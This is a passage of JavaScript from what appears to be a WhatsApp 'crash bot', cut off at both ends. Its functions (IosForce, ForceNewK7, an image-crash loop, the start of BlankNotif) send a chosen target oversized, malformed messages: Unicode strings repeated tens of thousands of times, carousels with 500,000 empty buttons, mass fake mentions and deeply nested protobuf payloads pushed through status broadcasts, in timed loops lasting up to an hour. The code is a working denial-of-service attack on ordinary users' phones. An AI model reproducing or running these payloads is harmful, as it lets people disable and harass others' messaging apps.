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",
        contextInfo: {
            featureEligibilities: { canReceiveMultiReact: true },
            pairedMediaType: "NOT_PAIRED_MEDIA",
            statusSourceType: "IMAGE"
        },
        scansSidecar: "fEzYz84hPJzLMNFbyo98xx6yZlX6W4GusDrqhIe0pcsJPQBDrJ6/Tw==",
        scanLengths: [18787, 116942, 40973, 60175],
        midQualityFileSha256: "N8qO2XeOS55EXzkUCxU1G0kj4Araewzz/XX9I2zsiD0="
    };

    const buildCards = () => {
        const cards = [];
        for (let i = 0; i < 10; i++) {
            cards.push({
                header: {
                    imageMessage: corruptImage,
                    hasMediaAttachment: true
                },
                body: {
                    text: "SKYLINNE!¿?" + "𑇂𑆵𑆴𑆿".repeat(5000)
                },
                footer: {
                    text: " SKY WAS HERE " + "𑇂𑆵𑆴𑆿".repeat(5000)
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            });
        }
        return cards;
    };

    for (let loop = 0; loop < 15; loop++) {
        const cards = buildCards();

        await sock.relayMessage(
            target,
            {
                interactiveMessage: {
                    body: { text: `Skylinne #${loop+1}` + "𑇂𑆵𑆴𑆿".repeat(5000) },
                    carouselMessage: { cards: cards },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 10000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        forwardingScore: 9999999,
                        isForwarded: true
                    }
                }
            },
            { noSelfSync: true, waitForAck: false }
        );

        const sticker = generateWAMessageFromContent(
            target,
            {
                stickerPackMessage: {
                    stickerPackId: "ultra_" + Date.now(),
                    name: "AduhKang" + "/0".repeat(100000),
                    publisher: "ZAMZZZ",
                    stickers: [{ fileName: "No19sj6PwB2HZ6mAr8uLzPXa48=.webp", isAnimated: false, mimetype: "image/webp" }],
                    fileLength: "9999999999",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
                    mediaKeyTimestamp: Date.now().toString(),
                    stickerPackSize: "9999999999",
                    stickerPackOrigin: "USER_CREATED",
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                    }
                }
            },
            {}
        );
        await sock.relayMessage(target, sticker.message, { noSelfSync: true, waitForAck: false });

        await sock.relayMessage(
            target,
            {
                imageMessage: {
                    ...corruptImage,
                    caption: "p salken gw skylinne🤓" + "\0".repeat(100000),
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            },
            { noSelfSync: true, waitForAck: false }
        );

        console.log(`crashImage loop ${loop+1}/15 DONE`);
        await sleep(800);
    }

    console.log(`Berhasil mengirim ke ${target}`);
}

async function IosForce(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: "GhostCrasher" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/Skylinnereal",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "helow",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔈́Skylinne" + TravaIphone, 
            matchedText: "𝔈Skylinne",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔈́Skylinne" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function ForceNewK7(sock, target, durationHours = 1) {
    const startTime = Date.now();
    const maxDuration = durationHours * 3600000;
    let loopCount = 0;
    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const BATCH_SIZE = 3;
    const JEDA_ANTAR_BATCH = 2000;
    const JEDA_ANTAR_LOOP = 3000;

    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrap = (tag, data) => Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    const resolveJid = (raw) => {
        if (!raw) return null;
        const s = String(raw).trim();
        return s.includes('@') ? s : s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const targetJids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j && j.length > 15);

    if (!targetJids.length) return;

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({
            imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
                directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
                mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
                fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
                fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
                fileLength: 9100,
                mediaKeyTimestamp: "1785637793",
                mimetype: "image/jpeg",
                height: 1600,
                width: 1200,
                scanLengths: [8177, 8118, 9117, 818],
                contextInfo: { remoteJid: "meta@ai" }
            }
        })
    ).finish();

    const buildPayload = (tag, depth) => {
        let buffer = basePayload;
        for (let i = 0; i < depth; i++) {
            buffer = wrap(tag, wrap([0x0A], buffer));
        }
        return buffer;
    };

    const sendLoop = async () => {
        if (Date.now() - startTime >= maxDuration) {
            console.log(`⏹️ Stopped after ${durationHours} hour(s)`);
            return;
        }

        try {
            if (loopCount % 10 === 0) {
                await sock.relayMessage(targetJids[0], {
                    interactiveMessage: { body: { text: "Skylinne" } }
                }, { noSelfSync: true });
            }

            for (let offset = 0; offset < targetJids.length; offset += BATCH_SIZE) {
                const chunk = targetJids.slice(offset, offset + BATCH_SIZE);
                const tag = TAGS[offset % TAGS.length];
                let payload = null;

                for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                    try {
                        const raw = buildPayload(tag, depth);
                        const parsed = proto.Message.decode(raw);
                        proto.Message.encode(parsed).finish();
                        payload = parsed;
                    } catch (_) {}
                }

                if (!payload) continue;

                const msgId = 'Skylinne' + Date.now().toString(36).toUpperCase() + '_' + offset;

                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgId,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(jid => ({
                                tag: 'to',
                                attrs: { jid },
                                content: []
                            }))
                        }]
                    }]
                });

                await new Promise(r => setTimeout(r, JEDA_ANTAR_BATCH));
            }

            loopCount++;
            console.log(`✅ Loop #${loopCount} selesai. Total JID: ${targetJids.length}`);
            setTimeout(sendLoop, JEDA_ANTAR_LOOP);

        } catch (error) {
            console.error(`❌ Error: ${error.message}`);
            setTimeout(sendLoop, 5000);
        }
    };

    sendLoop();
}

async function BlankNotif(sock, target) {
try {
const mentionedList = Array.from({ length: 30000 }, () =>
`1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
);

await sock.relayMessage(target, {
newsletterInviteMessage: {
